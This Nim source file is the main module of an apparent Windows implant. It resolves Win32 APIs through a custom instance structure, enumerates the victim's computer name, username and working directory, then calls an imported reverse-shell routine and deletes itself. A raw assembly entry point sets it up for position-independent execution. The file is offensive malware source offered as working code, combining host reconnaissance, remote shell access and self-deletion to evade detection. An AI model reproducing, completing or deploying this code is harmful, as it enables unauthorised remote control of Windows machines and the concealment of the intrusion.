import winim/lean

import utils/[stdio]

import instance, reverse_shell, self_delete

proc getComputerName(): pointer =
  var 
    dwSize: DWORD
    buf: LPSTR
  if ninst.Win32.GetComputerNameExA(computerNameNetBIOS, NULL, dwSize.addr) == 0:
    buf = cast[LPSTR](ninst.Win32.LocalAlloc(LPTR, dwSize))
    if buf != nil and ninst.Win32.GetComputerNameExA(computerNameNetBIOS, buf, dwSize.addr) != 0:
        return buf
  return nil

proc whoamiA*(): pointer =
  var
    dwSize: DWORD
    buf: LPSTR
  if ninst.Win32.GetUserNameA(NULL, dwSize.addr) == 0  and ninst.Win32.GetLastError() == ERROR_INSUFFICIENT_BUFFER:
    buf = cast[LPSTR](ninst.Win32.LocalAlloc(LPTR, dwSize + 1))
    if buf != nil and ninst.Win32.GetUserNameA(cast[LPSTR](buf), dwSize.addr) != 0:
      return buf
  return nil

proc getCurDir(): pointer =
  var buf: LPSTR = cast[LPSTR](ninst.Win32.LocalAlloc(LPTR, MAX_PATH))
  if ninst.Win32.GetCurrentDirectoryA(MAX_PATH.DWORD, buf) != 0:
    return buf
  else: return nil

proc main() {.exportc: "Main".} =

  discard init(ninst)

  PRINTA("[+] NIMLESS_INSTANCE\n".cstring)
  PRINTA(" \\__> Size of Instance: %i\n".cstring, sizeof(ninst))
  PRINTA(" \\__> Size of    Win32: %i\n".cstring, sizeof(ninst.Win32))
  PRINTA(" \\__> Address of ninst: %p\n".cstring, cast[int](ninst.addr))

  var 
    pComputerName = getComputerName()
    pUsername     = whoamiA()
    pCurDir       = getCurDir()
  
  PRINTA("[+] Enumeration\n".cstring)
  PRINTA(" \\__> ComputerName: %s\n".cstring, pComputerName)
  PRINTA(" \\__> Username: %s\n".cstring, pUsername)
  PRINTA(" \\__> Current Directory: \"%s\"\n".cstring, pCurDir)

  # Free buffers
  discard ninst.Win32.LocalFree(cast[HLOCAL](pComputerName))
  discard ninst.Win32.LocalFree(cast[HLOCAL](pUsername))
  discard ninst.Win32.LocalFree(cast[HLOCAL](pCurDir))

  if reverseShell():
    PRINTA("[+] Spawning reverse shell\n".cstring)
    PRINTA(" \\__> deleteSelf\n".cstring)
    discard deleteSelf()
  else:
    PRINTA("[!] Failed to spawn reverse shell\n".cstring)
    PRINTA(" \\__> Attempting to deleteSelf\n".cstring)

  ninst.Win32.ExitProcess(69)


{.passC:"-masm=intel".}
proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()


